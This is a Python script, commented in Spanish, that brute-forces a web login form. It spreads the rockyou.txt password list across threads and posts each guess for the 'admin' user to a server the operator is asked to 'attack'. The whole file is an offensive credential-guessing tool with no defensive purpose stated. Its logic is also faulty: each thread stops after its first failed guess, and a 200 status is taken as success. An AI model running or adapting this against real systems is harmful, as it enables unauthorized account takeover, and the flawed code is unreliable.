import threading
import requests
import time

class Mi_hilo(threading.Thread):
    def __init__(self, contrasenas, url):
        self.url = url
        self.contrasena = ''
        # Recibe los atributos de este hilo
        self.contrasenas = contrasenas
        # Inicializa flag de finalización del hilo
        self.final = False
        # Inicializa el Thread, llamando a la superclase
        threading.Thread.__init__(self)

    # Este método sustituye al target del Thread
    # Código que ejecuta cada hilo
    def run(self): 
        r = ""
        with requests.session() as s:
            for contrasena in self.contrasenas:
                if self.final:
                    return
                datos = {'username': 'admin','password':contrasena}
                peticion = s.post(self.url,data=datos)
                if  peticion.status_code == 200:
                    self.contrasena_correcta = contrasena
                    for hilo in self.hilos:
                        # No para el hilo actual
                        if hilo!=self:
                            hilo.stop()
                            print(self.final)
                            return self.contrasena_correcta
                else:
                    r += "[+] === Contraseña :" + contrasena + " incorrecta!!!" + '\n'
                    return r
                    
    # Definimos stop() activando la flag de finalización
    def stop(self):
        self.final = True

    # Sobrecargamos método start para recibir la lista con el resto de hilos
    def start(self, hilos):
        self.hilos = hilos
        # Llama al método start() de la superclase
        threading.Thread.start(self)

if __name__ == '__main__':
    url = input("¿Qué servidor quieres atacar?")
    principio = time.time()
    n_hilos = int(input("Hilos que quieres probar"))

    lista_contrasenas = []
    contrasena = []
    contador = 0
    restantes = 0
    saltar = False

    with open("rockyou.txt", "r", encoding="ANSI") as fman:
        total_filas = len(fman.readlines())
        
        if total_filas % n_hilos:
        
        # HACK esto sirve por si el numero de hilos al dividdir el
        # fichero hace que sobren lineas, las restantes iran a una lista aparte

            restantes = total_filas % n_hilos
        salto = total_filas // n_hilos

    with open("rockyou.txt", "r", encoding="ANSI") as fman:
        while contador <= total_filas:
            if contador + total_filas // n_hilos > total_filas:
                break
            # Dividimos todas las contraseñas según hilos
            contrasena = []
            for _ in range(contador, salto):
            
            #HACK: para cada elemento en el rango contador (empieza en cero) y salto (dividir el fichero entre numero de hilos)
            # vamos añadiendo las contraseñas a la lista, cuando termine de iterar en este salto, sumamos la cantidad de lineas
            # leidas

                contrasena.append(fman.readline().rstrip())
            # Contraseñas sobrantes
            lista_contrasenas.append(contrasena)
            contador += total_filas // n_hilos
            salto += total_filas // n_hilos
        if restantes:
            for _ in range(restantes):
                contrasena.append(fman.readline().rstrip())

    # Lista de hilos
    hilos = []
    # Crea los hilos
    for i in range(len(lista_contrasenas)):
        hilos.append(Mi_hilo(lista_contrasenas[i], url))
    # Inicia los hilos
    for hilo in hilos:
        hilo.start(hilos)

# Pinta en pantalla los segundos que ha tardado
print("--- %s segundos ---" % (time.time() - principio ))